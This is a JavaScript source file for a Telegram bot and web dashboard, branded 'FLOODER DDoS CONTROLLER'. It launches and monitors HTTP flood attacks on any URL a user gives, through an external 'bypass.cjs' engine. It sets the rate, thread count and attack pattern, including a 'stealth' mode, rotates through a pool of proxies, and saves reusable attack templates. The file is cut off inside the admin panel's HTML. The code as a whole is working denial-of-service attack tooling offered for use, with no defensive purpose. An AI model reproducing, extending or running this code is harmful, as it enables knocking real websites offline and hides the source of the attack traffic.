import { Telegraf } from 'telegraf';
import { spawn, exec } from 'child_process';
import fs from 'fs';
import dotenv from 'dotenv';
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import os from 'os';
import crypto from 'crypto';
import session from 'express-session';
import bodyParser from 'body-parser';
import http from 'http';
import https from 'https';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Load environment variables
dotenv.config();
console.log('\x1b[36m%s\x1b[0m', '📁 Loading environment...');

const token = process.env.TELEGRAM_BOT_TOKEN;
if (!token) {
    console.error('\x1b[31m%s\x1b[0m', '❌ ERROR: TELEGRAM_BOT_TOKEN not found!');
    process.exit(1);
}

const bot = new Telegraf(token);
const ADMIN_ID = '6247762383';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'flooder2026';

// ========== ADVANCED CONFIGURATION ==========
const CONFIG = {
    MAX_CONCURRENT_ATTACKS: 5,
    MAX_THREADS: 1000,
    MAX_RATE: 100000,
    MAX_DURATION: 3600,
    STATUS_UPDATE: 3000,
    METRICS_UPDATE: 5000,
    PROXY_CHECK: 60000,
    AUTO_SCALE: true,
    SCALE_THRESHOLD: 0.8,
    MAX_AUTO_THREADS: 500,
    ATTACK_PATTERNS: ['constant', 'square', 'saw', 'random', 'exponential', 'stealth'],
    MAX_PROXY_FAILS: 3,
    PROXY_TEST_TIMEOUT: 5000,
    AUTO_ROTATE_INTERVAL: 300000,
    MAX_MEMORY: 1024 * 1024 * 1024,
    MAX_CPU: 80,
    MAX_BANDWIDTH: 100 * 1024 * 1024
};

// ========== DATA STORES ==========
const attacks = new Map();
const templates = new Map();
const schedules = new Map();
const proxyPool = new Map();
const userSessions = new Map();
const commandHistory = [];
const metrics = {
    startTime: Date.now(),
    totalAttacks: 0,
    totalRequests: 0,
    totalBytes: 0,
    totalSuccess: 0,
    totalFail: 0,
    peakRPS: 0,
    bandwidth: []
};

// ========== PROXY MANAGER ==========
class ProxyManager {
    constructor() {
        this.proxies = new Map();
        this.loadProxies();
        this.startHealthCheck();
    }

    loadProxies() {
        if (!fs.existsSync('proxy.txt')) return;
        try {
            const content = fs.readFileSync('proxy.txt', 'utf-8');
            const lines = content.split('\n')
                .map(l => l.trim())
                .filter(l => l && l.includes(':'));
            
            lines.forEach(proxy => {
                if (!this.proxies.has(proxy)) {
                    this.proxies.set(proxy, {
                        fails: 0,
                        latency: [],
                        lastUsed: 0,
                        successCount: 0,
                        failCount: 0
                    });
                }
            });
            
            // Remove proxies not in file
            for (const [proxy] of this.proxies) {
                if (!lines.includes(proxy)) {
                    this.proxies.delete(proxy);
                }
            }
            
            console.log('\x1b[36m%s\x1b[0m', `📥 Loaded ${this.proxies.size} proxies for flooding`);
        } catch (err) {
            console.error('Error loading proxies:', err);
        }
    }

    getProxy(strategy = 'round-robin') {
        if (this.proxies.size === 0) return null;
        
        const validProxies = Array.from(this.proxies.entries())
            .filter(([_, data]) => data.fails < CONFIG.MAX_PROXY_FAILS);
        
        if (validProxies.length === 0) return null;
        
        switch (strategy) {
            case 'random':
                return validProxies[Math.floor(Math.random() * validProxies.length)][0];
                
            case 'fastest':
                return validProxies.sort((a, b) => {
                    const aLat = a[1].latency.reduce((s, v) => s + v, 0) / a[1].latency.length || Infinity;
                    const bLat = b[1].latency.reduce((s, v) => s + v, 0) / b[1].latency.length || Infinity;
                    return aLat - bLat;
                })[0][0];
                
            case 'round-robin':
            default:
                const index = Math.floor(Math.random() * validProxies.length);
                return validProxies[index][0];
        }
    }

    reportSuccess(proxy) {
        const data = this.proxies.get(proxy);
        if (data) {
            data.successCount++;
            data.lastUsed = Date.now();
        }
    }

    reportFailure(proxy) {
        const data = this.proxies.get(proxy);
        if (data) {
            data.fails++;
            data.failCount++;
            if (data.fails >= CONFIG.MAX_PROXY_FAILS) {
                console.log('\x1b[31m%s\x1b[0m', `❌ Removing dead proxy: ${proxy}`);
                this.proxies.delete(proxy);
            }
        }
    }

    reportLatency(proxy, ms) {
        const data = this.proxies.get(proxy);
        if (data) {
            data.latency.push(ms);
            if (data.latency.length > 10) data.latency.shift();
        }
    }

    startHealthCheck() {
        setInterval(() => {
            this.testProxies();
        }, CONFIG.PROXY_CHECK);
    }

    async testProxies() {
        console.log('\x1b[33m%s\x1b[0m', '🔄 Testing proxy health for flooding...');
        const testUrl = 'http://httpbin.org/get';
        
        for (const [proxy, data] of this.proxies) {
            if (data.fails >= CONFIG.MAX_PROXY_FAILS) continue;
            
            const [host, port] = proxy.split(':');
            const start = Date.now();
            
            try {
                await new Promise((resolve, reject) => {
                    const req = http.get({
                        hostname: host,
                        port: parseInt(port),
                        path: testUrl,
                        timeout: CONFIG.PROXY_TEST_TIMEOUT
                    }, (res) => {
                        const latency = Date.now() - start;
                        this.reportLatency(proxy, latency);
                        this.reportSuccess(proxy);
                        resolve();
                    });
                    
                    req.on('error', reject);
                    req.on('timeout', () => {
                        req.destroy();
                        reject(new Error('Timeout'));
                    });
                });
            } catch (err) {
                this.reportFailure(proxy);
            }
        }
        
        console.log('\x1b[36m%s\x1b[0m', `✅ Proxy health check complete: ${this.proxies.size} ready to flood`);
    }

    getStats() {
        return {
            total: this.proxies.size,
            active: Array.from(this.proxies.values()).filter(d => d.fails < CONFIG.MAX_PROXY_FAILS).length,
            dead: Array.from(this.proxies.values()).filter(d => d.fails >= CONFIG.MAX_PROXY_FAILS).length,
            avgLatency: Array.from(this.proxies.values())
                .flatMap(d => d.latency)
                .reduce((s, v) => s + v, 0) / Array.from(this.proxies.values()).flatMap(d => d.latency).length || 0
        };
    }
}

const proxyManager = new ProxyManager();

// ========== HELPER FUNCTIONS ==========
function countRunningAttacks() {
    let count = 0;
    for (const attack of attacks.values()) {
        if (attack.isRunning) count++;
    }
    return count;
}

function formatNumber(num) {
    return num?.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",") || "0";
}

function getStatusEmoji(status) {
    if (status >= 200 && status < 300) return '✅';
    if (status >= 400 && status < 500) return '❌';
    if (status >= 500) return '⚠️';
    return '🔄';
}

function createProgressBar(percent, size = 10) {
    const filled = Math.floor(percent / size);
    return '█'.repeat(filled) + '░'.repeat(size - filled);
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function formatDuration(seconds) {
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = seconds % 60;
    return `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
}

function calculateSuccessRate(attack) {
    if (!attack.requestCount) return 0;
    return Math.round((attack.successCount / attack.requestCount) * 100);
}

function loadAndCleanProxies() {
    if (!fs.existsSync('proxy.txt')) return [];
    try {
        const content = fs.readFileSync('proxy.txt', 'utf-8');
        return content.split('\n')
            .map(line => line.trim())
            .filter(line => line && line.includes(':'));
    } catch {
        return [];
    }
}

// ========== BOT COMMANDS ==========
bot.start((ctx) => {
    const isAdmin = ctx.from.id.toString() === ADMIN_ID;
    ctx.replyWithMarkdown(`
╔══════════════════════════════════════════════════════════════╗
║  🌊 FLOODER DDoS CONTROLLER                                   ║
╠══════════════════════════════════════════════════════════════╣
║  👋 Welcome, ${ctx.from.first_name}!                         ║
║  📊 Status: 🟢 Online                                         ║
║  👑 Role: ${isAdmin ? '⭐ Admin' : '👤 User'}                 ║
╠══════════════════════════════════════════════════════════════╣
║  📌 Commands:                                                 ║
║  /attack <url> <time> <rate> <threads> [pattern]             ║
║  /stop <id>                                                   ║
║  /list                                                        ║
║  /stats                                                       ║
║  /save <name> <url> <time> <rate> <threads> [pattern]        ║
║  /load <name>                                                 ║
║  /templates                                                   ║
║  /setproxy                                                    ║
║  /proxies                                                     ║
║  /help                                                        ║
╚══════════════════════════════════════════════════════════════╝
    `);
});

bot.help((ctx) => {
    ctx.replyWithMarkdown(`
📚 *FLOODER COMMANDS*

🎯 *Attack Commands*
/attack \`<url> <time> <rate> <threads> [pattern]\`
  Launch a DDoS flood
  Patterns: constant, square, saw, random, exponential
  Example: \`/attack https://example.com 60 1000 50 random\`

/stop \`<id>\` - Stop a specific flood
/list - List all active floods
/stats - Show statistics

📋 *Template Commands*
/save \`<name> <url> <time> <rate> <threads> [pattern]\`
/load \`<name>\`
/templates - List saved templates

🌊 *Proxy Commands*
/setproxy - Upload proxy.txt file
/proxies - Show proxy statistics

👑 *Admin Only*
/stopall - Stop all attacks
/delete \`<template>\` - Delete template

🌐 *Web Dashboard*
User View: https://flooder-controller.up.railway.app
Admin Login: https://flooder-controller.up.railway.app/login
    `);
});

bot.command('test', (ctx) => ctx.reply('✅ FLOODER bot is operational!'));

// ========== ATTACK COMMAND ==========
bot.command('attack', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [url, time, rate, threads, pattern = 'constant'] = args;

    if (!url || !time || !rate || !threads) {
        return ctx.reply('❌ Usage: /attack <url> <time> <rate> <threads> [pattern]');
    }

    if (countRunningAttacks() >= CONFIG.MAX_CONCURRENT_ATTACKS) {
        return ctx.reply('⚠️ Maximum concurrent floods reached. Wait for some to finish or use /stopall');
    }

    if (!fs.existsSync('bypass.cjs')) {
        return ctx.reply('❌ Flood engine (bypass.cjs) not found!');
    }

    const proxies = loadAndCleanProxies();
    const attackId = Date.now().toString();
    const duration = Math.min(parseInt(time), CONFIG.MAX_DURATION);
    const attackRate = Math.min(parseInt(rate), CONFIG.MAX_RATE);
    const attackThreads = Math.min(parseInt(threads), CONFIG.MAX_THREADS);
    const attackPattern = CONFIG.ATTACK_PATTERNS.includes(pattern) ? pattern : 'constant';
    const startTime = Date.now();

    const statusMsg = await ctx.replyWithMarkdown(`
╔══════════════════════════════════════════════════════════════╗
║  🌊 FLOOD SEQUENCE INITIALIZED                                ║
╠══════════════════════════════════════════════════════════════╣
║  ID: ${attackId.slice(0, 8)}...                             ║
║  TARGET: ${url.substring(0, 40)}...                          ║
╠══════════════════════════════════════════════════════════════╣
║  DURATION: ${duration}s                                      ║
║  RATE: ${attackRate.toLocaleString()}/s                      ║
║  THREADS: ${attackThreads}                                   ║
║  PATTERN: ${attackPattern.toUpperCase()}                     ║
║  PROXIES: ${proxies.length} available                        ║
╚══════════════════════════════════════════════════════════════╝
    `);

    const attack = spawn('node', [
        'bypass.cjs',
        url,
        duration.toString(),
        attackRate.toString(),
        attackThreads.toString(),
        'proxy.txt',
        attackPattern
    ]);

    attacks.set(attackId, {
        process: attack,
        url,
        startTime,
        duration,
        rate: attackRate,
        threads: attackThreads,
        pattern: attackPattern,
        userId: ctx.from.id,
        username: ctx.from.username || ctx.from.first_name,
        chatId: ctx.chat.id,
        messageId: statusMsg.message_id,
        requestCount: 0,
        successCount: 0,
        failCount: 0,
        bytesTransferred: 0,
        statusCodes: {},
        responseTimes: [],
        isRunning: true,
        lastUpdate: Date.now()
    });

    attack.stdout.on('data', (data) => {
        const attackData = attacks.get(attackId);
        if (!attackData) return;
        
        const output = data.toString();
        
        if (output.includes('Status: [')) {
            const match = output.match(/Status: \[([^\]]+)\]/);
            if (match) {
                const parts = match[1].split(', ');
                let total = 0;
                let success = 0;
                let bytes = 0;
                
                parts.forEach(part => {
                    const [code, count] = part.split(': ');
                    if (count) {
                        const numCount = parseInt(count);
                        total += numCount;
                        if (code.startsWith('2')) success += numCount;
                        attackData.statusCodes[code] = (attackData.statusCodes[code] || 0) + numCount;
                        bytes += numCount * 1024;
                    }
                });
                
                attackData.requestCount = total;
                attackData.successCount = success;
                attackData.failCount = total - success;
                attackData.bytesTransferred += bytes;
                
                metrics.totalRequests += total - (attackData.lastTotal || 0);
                metrics.totalSuccess += success - (attackData.lastSuccess || 0);
                metrics.totalFail += (total - success) - (attackData.lastFail || 0);
                metrics.totalBytes += bytes;
                
                const now = Date.now();
                const timeDiff = (now - attackData.lastUpdate) / 1000;
                const reqDiff = total - (attackData.lastTotal || 0);
                const currentRPS = Math.floor(reqDiff / timeDiff);
                
                if (currentRPS > metrics.peakRPS) {
                    metrics.peakRPS = currentRPS;
                }
                
                const mbps = (bytes * 8) / (1024 * 1024 * timeDiff);
                metrics.bandwidth.push(mbps);
                if (metrics.bandwidth.length > 60) metrics.bandwidth.shift();
                
                attackData.lastTotal = total;
                attackData.lastSuccess = success;
                attackData.lastFail = total - success;
                attackData.lastUpdate = now;
            }
        }
    });

    attack.stderr.on('data', (data) => {
        console.error('\x1b[31m%s\x1b[0m', `[${attackId}] Flood error:`, data.toString());
    });

    attack.on('error', (err) => {
        console.error('\x1b[31m%s\x1b[0m', `[${attackId}] Process error:`, err.message);
        ctx.reply(`⚠️ Flood error: ${err.message}`);
        attacks.delete(attackId);
    });

    const updateInterval = setInterval(() => {
        const attackData = attacks.get(attackId);
        if (!attackData || !attackData.isRunning) {
            clearInterval(updateInterval);
            return;
        }

        const elapsed = Math.floor((Date.now() - attackData.startTime) / 1000);
        const percent = Math.min(100, Math.floor((elapsed / attackData.duration) * 100));
        const successRate = calculateSuccessRate(attackData);
        
        const now = Date.now();
        const timeDiff = (now - attackData.lastUpdate) / 1000;
        const reqDiff = attackData.requestCount - (attackData.lastTotal || 0);
        const currentRPS = Math.floor(reqDiff / Math.max(0.1, timeDiff));
        
        const topCodes = Object.entries(attackData.statusCodes)
            .sort((a, b) => b[1] - a[1])
            .slice(0, 3)
            .map(([code, count]) => `${getStatusEmoji(parseInt(code))} ${code}:${count}`)
            .join(' ');

        const progressBar = createProgressBar(percent);
        const bandwidth = (attackData.bytesTransferred * 8) / (1024 * 1024 * Math.max(1, elapsed));
        
        const updateMessage = 
`╔══════════════════════════════════════════════════════════════╗
║  🌊 FLOOD IN PROGRESS - ID: ${attackId.slice(0, 8)}           ║
╠══════════════════════════════════════════════════════════════╣
║  PROGRESS: ${progressBar} ${percent}%                        ║
║  ELAPSED: ${elapsed}s / ${attackData.duration}s              ║
╠══════════════════════════════════════════════════════════════╣
║  PACKETS: ${attackData.requestCount.toLocaleString()}        ║
║  SUCCESS: ${attackData.successCount.toLocaleString()} (${successRate}%) ║
║  RPS: ${currentRPS} | BANDWIDTH: ${bandwidth.toFixed(2)} Mbps ║
║  CODES: ${topCodes || 'Collecting...'}                       ║
╚══════════════════════════════════════════════════════════════╝`;

        ctx.telegram.editMessageText(attackData.chatId, attackData.messageId, null, updateMessage, { parse_mode: 'Markdown' })
            .catch(() => {});
    }, CONFIG.STATUS_UPDATE);

    attack.on('close', (code) => {
        clearInterval(updateInterval);
        
        const attackData = attacks.get(attackId);
        if (!attackData) return;
        
        attackData.isRunning = false;
        metrics.totalAttacks++;
        
        const elapsed = Math.floor((Date.now() - attackData.startTime) / 1000);
        const successRate = calculateSuccessRate(attackData);
        const avgRPS = Math.floor(attackData.requestCount / Math.max(1, elapsed));
        
        let statusEmoji, statusText;
        if (code === 0) {
            statusEmoji = '✅';
            statusText = 'FLOOD COMPLETED';
        } else if (attackData.requestCount > 0) {
            statusEmoji = successRate > 50 ? '⚠️' : '❌';
            statusText = successRate > 50 ? 'PARTIAL FLOOD' : 'FLOOD FAILED';
        } else {
            statusEmoji = '💀';
            statusText = 'FLOOD CRASHED';
        }

        const codeBreakdown = Object.entries(attackData.statusCodes)
            .sort((a, b) => b[1] - a[1])
            .map(([code, count]) => `  ${getStatusEmoji(parseInt(code))} HTTP ${code}: ${count.toLocaleString()}`)
            .join('\n');

        const finalMessage = 
`${statusEmoji} *${statusText}* ${statusEmoji}

ID: \`${attackId.slice(0, 8)}\`
Target: ${attackData.url}
Duration: ${elapsed}s / ${attackData.duration}s

📊 *Statistics*
Total Packets: ${attackData.requestCount.toLocaleString()}
Success: ${attackData.successCount.toLocaleString()} (${successRate}%)
Average RPS: ${avgRPS}

🔍 *Status Codes*
${codeBreakdown || '  No data collected'}

👤 User: @${attackData.username}
Pattern: ${attackData.pattern.toUpperCase()}
Exit Code: ${code}`;

        ctx.telegram.editMessageText(attackData.chatId, attackData.messageId, null, finalMessage, { parse_mode: 'Markdown' })
            .catch(() => {});
        
        attacks.delete(attackId);
    });
});

// ========== STOP COMMAND ==========
bot.command('stop', (ctx) => {
    const attackId = ctx.message.text.split(' ')[1];
    const attack = attacks.get(attackId);
    
    if (!attack) return ctx.reply('❌ Flood not found');
    
    if (attack.userId !== ctx.from.id && ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ Not your flood');
    }

    attack.process.kill('SIGINT');
    ctx.reply(`🛑 Flood ${attackId.slice(0, 8)} stopped`);
});

// ========== LIST COMMAND ==========
bot.command('list', (ctx) => {
    if (attacks.size === 0) return ctx.reply('📊 No active floods');

    let msg = '📊 *ACTIVE FLOODS*\n\n';
    attacks.forEach((a, id) => {
        if (!a.isRunning) return;
        const elapsed = Math.floor((Date.now() - a.startTime) / 1000);
        const percent = Math.min(100, Math.floor((elapsed / a.duration) * 100));
        const successRate = calculateSuccessRate(a);
        const progressBar = createProgressBar(percent, 5);
        
        msg += `*ID:* \`${id.slice(-8)}\`\n`;
        msg += `👤 @${a.username}\n`;
        msg += `🎯 ${a.url.substring(0, 40)}...\n`;
        msg += `📊 ${progressBar} ${percent}%\n`;
        msg += `⏱️ ${elapsed}s/${a.duration}s | ✅ ${successRate}%\n`;
        msg += `📥 ${formatNumber(a.requestCount)} packets\n\n`;
    });
    
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

// ========== STATS COMMAND ==========
bot.command('stats', (ctx) => {
    const running = countRunningAttacks();
    const totalReqs = Array.from(attacks.values()).reduce((s, a) => s + (a.requestCount || 0), 0);
    const totalSuccess = Array.from(attacks.values()).reduce((s, a) => s + (a.successCount || 0), 0);
    
    const proxyStats = proxyManager.getStats();
    const uptime = process.uptime();
    
    ctx.replyWithMarkdown(`
📊 *FLOODER STATISTICS*

🎯 *Floods*
Active: ${running}/${CONFIG.MAX_CONCURRENT_ATTACKS}
Total: ${metrics.totalAttacks}
Templates: ${templates.size}

📨 *Traffic*
Packets: ${totalReqs.toLocaleString()}
Success: ${totalSuccess.toLocaleString()} (${totalReqs > 0 ? Math.round((totalSuccess / totalReqs) * 100) : 0}%)
Peak Rate: ${metrics.peakRPS} pps

🌊 *Proxies*
Total: ${proxyStats.total}
Active: ${proxyStats.active}
Avg Latency: ${Math.round(proxyStats.avgLatency)}ms

⏱️ *System*
Uptime: ${formatDuration(uptime)}
Memory: ${formatBytes(process.memoryUsage().rss)}
    `);
});

// ========== PROXY COMMANDS ==========
bot.command('setproxy', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ Unauthorized');
    }
    ctx.reply('📤 Send proxy.txt file (format: ip:port)');
});

bot.command('proxies', (ctx) => {
    const stats = proxyManager.getStats();
    ctx.replyWithMarkdown(`
🌊 *PROXY POOL STATUS*

Total: ${stats.total}
Active: ${stats.active}
Dead: ${stats.dead}
Avg Latency: ${Math.round(stats.avgLatency)}ms

Commands:
/proxy test - Test proxy health
/proxy list - List all proxies
    `);
});

bot.command('proxy', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const subcmd = args[0];

    if (subcmd === 'test') {
        const msg = await ctx.reply('🔄 Testing proxies...');
        await proxyManager.testProxies();
        ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, 
            `✅ Proxy test complete. Active: ${proxyManager.getStats().active}`);
    } else if (subcmd === 'list') {
        const proxies = Array.from(proxyManager.proxies.entries())
            .slice(0, 10)
            .map(([p, d]) => `• ${p} (${d.latency.length > 0 ? Math.round(d.latency.reduce((s, v) => s + v, 0) / d.latency.length) + 'ms' : 'untested'})`)
            .join('\n');
        ctx.reply(`📋 *Proxy List*\n\n${proxies || 'No proxies loaded'}\n\n_Showing first 10 of ${proxyManager.proxies.size}_`, { parse_mode: 'Markdown' });
    }
});

// ========== TEMPLATE COMMANDS ==========
bot.command('save', (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [name, url, time, rate, threads, pattern = 'constant'] = args;
    
    if (!name || !url || !time || !rate || !threads) {
        return ctx.reply('❌ Usage: /save <name> <url> <time> <rate> <threads> [pattern]');
    }
    
    templates.set(name, { url, time, rate, threads, pattern });
    ctx.reply(`✅ Template saved: \`${name}\``);
});

bot.command('load', (ctx) => {
    const name = ctx.message.text.split(' ')[1];
    const template = templates.get(name);
    
    if (!template) return ctx.reply('❌ Template not found');
    
    const fakeMsg = {
        message: {
            text: `/attack ${template.url} ${template.time} ${template.rate} ${template.threads} ${template.pattern}`,
            chat: ctx.chat,
            from: ctx.from
        }
    };
    bot.command('attack')(fakeMsg);
});

bot.command('templates', (ctx) => {
    if (templates.size === 0) return ctx.reply('📭 No templates');
    
    let msg = '📋 *TEMPLATES*\n\n';
    templates.forEach((data, name) => {
        msg += `*${name}*\n`;
        msg += `  🎯 ${data.url}\n`;
        msg += `  ⏱️ ${data.time}s | ⚡ ${data.rate}/s | 🧵 ${data.threads}t | 📊 ${data.pattern}\n\n`;
    });
    
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

bot.command('delete', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return ctx.reply('⛔ Unauthorized');
    
    const name = ctx.message.text.split(' ')[1];
    if (templates.delete(name)) {
        ctx.reply(`✅ Template deleted: ${name}`);
    } else {
        ctx.reply('❌ Template not found');
    }
});

// ========== STOP ALL ==========
bot.command('stopall', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return ctx.reply('⛔ Unauthorized');
    
    const count = attacks.size;
    attacks.forEach((a) => {
        if (a.isRunning) a.process.kill('SIGINT');
    });
    attacks.clear();
    ctx.reply(`🛑 Stopped ${count} floods`);
});

// ========== FILE HANDLER ==========
bot.on('document', async (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return;

    if (ctx.message.document.file_name === 'proxy.txt') {
        const waitMsg = await ctx.reply('🔄 Processing proxy file...');
        
        try {
            const file = await ctx.telegram.getFile(ctx.message.document.file_id);
            const fileUrl = `https://api.telegram.org/file/bot${token}/${file.file_path}`;
            const response = await fetch(fileUrl);
            const content = await response.text();
            
            const proxies = content.split('\n')
                .map(l => l.trim())
                .filter(l => l && l.includes(':'));
            
            fs.writeFileSync('proxy.txt', proxies.join('\n'));
            proxyManager.loadProxies();
            
            await ctx.telegram.editMessageText(
                ctx.chat.id,
                waitMsg.message_id,
                null,
                `✅ Loaded ${proxies.length} proxies for flooding`
            );
        } catch (error) {
            ctx.reply('❌ Failed: ' + error.message);
        }
    }
});

// ========== ERROR HANDLING ==========
bot.catch((err, ctx) => {
    console.error('\x1b[31m%s\x1b[0m', `[ERROR] ${err.message}`);
});

// ========== EXPRESS SERVER WITH DUAL PANELS ==========
const app = express();
const port = process.env.PORT || 3000;
const HOST = '::';

// Session middleware
app.use(session({
    secret: crypto.randomBytes(32).toString('hex'),
    resave: false,
    saveUninitialized: true,
    cookie: { 
        secure: false,
        maxAge: 3600000 // 1 hour
    }
}));

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));

// Middleware to check if authenticated
const isAuthenticated = (req, res, next) => {
    if (req.session.authenticated) {
        next();
    } else {
        res.status(401).json({ error: 'Unauthorized' });
    }
};

// Home page - shows user panel by default
app.get('/', (req, res) => {
    const uptime = Math.floor((Date.now() - metrics.startTime) / 1000);
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>FLOODER Monitor</title>
            <style>
                body { background: #0a0a0a; color: #00ffff; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
                .container { max-width: 1200px; margin: 0 auto; }
                .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 2px solid #00ffff; padding-bottom: 10px; }
                h1 { color: #00ffff; text-shadow: 0 0 10px #00ffff; font-size: 32px; margin: 0; }
                .user-badge { background: #333; color: #00ffff; padding: 5px 15px; border-radius: 3px; border: 1px solid #00ffff; }
                .admin-login { background: #00ffff; color: #000; padding: 8px 20px; text-decoration: none; border-radius: 5px; font-weight: bold; margin-left: 10px; }
                .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin: 20px 0; }
                .stat-card { border: 1px solid #00ffff; padding: 15px; border-radius: 5px; text-align: center; background: rgba(0, 255, 255, 0.1); }
                .stat-value { font-size: 28px; font-weight: bold; color: #00ffff; }
                .stat-label { font-size: 12px; color: #888; }
                .attack-item { border: 1px solid #333; padding: 15px; margin: 10px 0; border-radius: 5px; background: rgba(0, 255, 255, 0.05); }
                .progress-bar { width: 100%; height: 20px; background: #333; border-radius: 10px; overflow: hidden; margin: 10px 0; }
                .progress-fill { height: 100%; background: #00ffff; transition: width 0.3s; }
                .attack-info { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 10px; }
                .info-item { background: #111; padding: 8px; border-radius: 5px; text-align: center; }
                .info-label { color: #888; font-size: 11px; }
                .info-value { color: #00ffff; font-size: 16px; font-weight: bold; }
                .blink { animation: blink 1s infinite; }
                @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
                .terminal { background: #111; padding: 15px; border-radius: 5px; border: 1px solid #333; margin: 20px 0; }
                .refresh-btn { background: #333; color: #00ffff; border: 1px solid #00ffff; padding: 5px 15px; border-radius: 3px; cursor: pointer; }
                .footer { text-align: center; margin-top: 30px; color: #666; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>🌊 FLOODER MONITOR</h1>
                    <div>
                        <span class="user-badge">👤 READ-ONLY</span>
                        <a href="/login" class="admin-login">ADMIN LOGIN</a>
                    </div>
                </div>

                <div class="terminal">
                    <div>> STATUS: <span class="blink" style="color:#00ffff">ONLINE</span> | ACTIVE: ${attacks.size} | UPTIME: ${hours}h ${minutes}m</div>
                </div>

                <div class="stats-grid">
                    <div class="stat-card"><div class="stat-value">${attacks.size}</div><div class="stat-label">Active</div></div>
                    <div class="stat-card"><div class="stat-value">${metrics.totalAttacks}</div><div class="stat-label">Total</div></div>
                    <div class="stat-card"><div class="stat-value">${(metrics.totalRequests / 1e6).toFixed(2)}M</div><div class="stat-label">Packets</div></div>
                    <div class="stat-card"><div class="stat-value">${(metrics.totalBytes / 1e9).toFixed(2)}GB</div><div class="stat-label">Bandwidth</div></div>
                </div>

                <h2>🎯 ACTIVE FLOODS</h2>
                <div id="attackList">
                    ${Array.from(attacks.entries()).map(([id, attack]) => {
                        const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
                        const percent = Math.min(100, Math.floor((elapsed / attack.duration) * 100));
                        const successRate = calculateSuccessRate(attack);
                        return `
                        <div class="attack-item">
                            <div><strong>ID:</strong> ${id.slice(-8)} | <strong>User:</strong> @${attack.username}</div>
                            <div><strong>Target:</strong> ${attack.url.substring(0, 60)}...</div>
                            <div class="progress-bar"><div class="progress-fill" style="width: ${percent}%"></div></div>
                            <div>${percent}% | ${elapsed}s / ${attack.duration}s</div>
                            <div class="attack-info">
                                <div class="info-item"><div class="info-label">PACKETS</div><div class="info-value">${attack.requestCount.toLocaleString()}</div></div>
                                <div class="info-item"><div class="info-label">SUCCESS</div><div class="info-value">${successRate}%</div></div>
                                <div class="info-item"><div class="info-label">RPS</div><div class="info-value">${Math.floor(attack.requestCount / Math.max(1, elapsed))}</div></div>
                            </div>
                        </div>
                        `;
                    }).join('')}
                    ${attacks.size === 0 ? '<div style="text-align: center; padding: 40px; color: #666;">No active floods</div>' : ''}
                </div>

                <div class="footer">
                    <p>FLOODER Monitor v3.0 | ${new Date().toLocaleString()}</p>
                    <button class="refresh-btn" onclick="location.reload()">⟳ REFRESH</button>
                </div>
            </div>
        </body>
        </html>
    `);
});

// Login page
app.get('/login', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>FLOODER Admin Login</title>
            <style>
                body { background: #0a0a0a; color: #00ffff; font-family: 'Courier New', monospace; height: 100vh; display: flex; justify-content: center; align-items: center; }
                .login-container { background: #111; border: 2px solid #00ffff; border-radius: 10px; padding: 40px; width: 400px; box-shadow: 0 0 30px #00ffff; }
                h1 { text-align: center; color: #00ffff; margin-bottom: 30px; }
                input { width: 100%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid #00ffff; color: #00ffff; font-family: 'Courier New', monospace; border-radius: 5px; }
                button { width: 100%; padding: 12px; background: #00ffff; color: #000; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; margin-top: 20px; }
                .error { color: #ff0000; text-align: center; margin-top: 10px; }
                .user-link { text-align: center; margin-top: 20px; }
                .user-link a { color: #888; text-decoration: none; }
            </style>
        </head>
        <body>
            <div class="login-container">
                <h1>🌊 FLOODER ADMIN</h1>
                <form method="POST" action="/login">
                    <input type="password" name="password" placeholder="Enter Admin Password" required>
                    <button type="submit">ACCESS TERMINAL</button>
                </form>
                ${req.query.error ? '<div class="error">❌ Invalid password</div>' : ''}
                <div class="user-link"><a href="/">👤 Return to User View</a></div>
            </div>
        </body>
        </html>
    `);
});

// Login handler
app.post('/login', (req, res) => {
    const { password } = req.body;
    if (password === ADMIN_PASSWORD) {
        req.session.authenticated = true;
        req.session.loginTime = Date.now();
        res.redirect('/admin');
    } else {
        res.redirect('/login?error=1');
    }
});

// Admin panel
app.get('/admin', isAuthenticated, (req, res) => {
    const uptime = Math.floor((Date.now() - metrics.startTime) / 1000);
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>FLOODER Admin</title>
            <style>
